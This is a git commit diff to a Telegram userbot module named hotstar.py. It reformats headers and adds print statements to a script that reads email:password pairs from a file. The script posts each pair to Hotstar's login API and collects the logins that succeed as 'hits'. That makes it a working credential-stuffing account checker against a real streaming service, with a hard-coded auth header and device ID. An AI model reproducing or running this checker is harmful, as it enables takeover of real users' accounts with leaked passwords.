c2647f0bbcd22ea3fbb0c9834e5450479328d8cd
StarkGang <StarkGangZ@gmail.com>
2020-12-21 18:09:23 +0530

    Update hotstar.py

--- fridaybot/modules/hotstar.py
+++ fridaybot/modules/hotstar.py
@@ -6,16 +6,15 @@ from fridaybot.utils import friday_on_cmd
 
 url = "https://api.hotstar.com/in/aadhar/v2/web/in/user/login"
 headers = {
-    "content-type": "application/json",
-    "Referer": "https://www.hotstar.com/",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0",
-    "Accept": "*/*",
-    "hotstarauth": "st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418",
-    "Accept-Language": "en-US,en;q=0.5",
-    "Accept-Encoding": "gzip, deflate",
-    "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop",
-}
-
+        'content-type': 'application/json',
+        'Referer': 'https://www.hotstar.com/',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
+        'Accept': '*/*',
+        'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate',
+        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
+        }
 
 @friday.on(friday_on_cmd(pattern="hotstar"))
 async def hotstar(event):
@@ -29,19 +28,14 @@ async def hotstar(event):
     lines = file.readlines()
     for line in lines:
         stark_dict.append(line)
+    print(stark_dict)
     for i in stark_dict:
         starkm = i.split(":")
         email = starkm[0]
         password = starkm[1]
-        payload = {
-            "isProfileRequired": "false",
-            "userData": {
-                "deviceId": "a7d1bc04-f55e-4b16-80e8-d8fbf4c91768",
-                "password": password,
-                "username": email,
-                "usertype": "email",
-            },
-        }
+        print(email)
+        print(password)
+        payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
         try:
             meke = requests.post(url, data=json.dumps(payload), headers=headers)
             print(f"{meke.text} {int(meke.status_code)}")
@@ -53,6 +47,7 @@ async def hotstar(event):
             hits_dict.append(f"{email}:{password}")
         else:
             bads += 1
+    print(hits_dict)
     if len(hits_dict) == 0:
         await event.edit("No Hits. " + meke.text)
         return
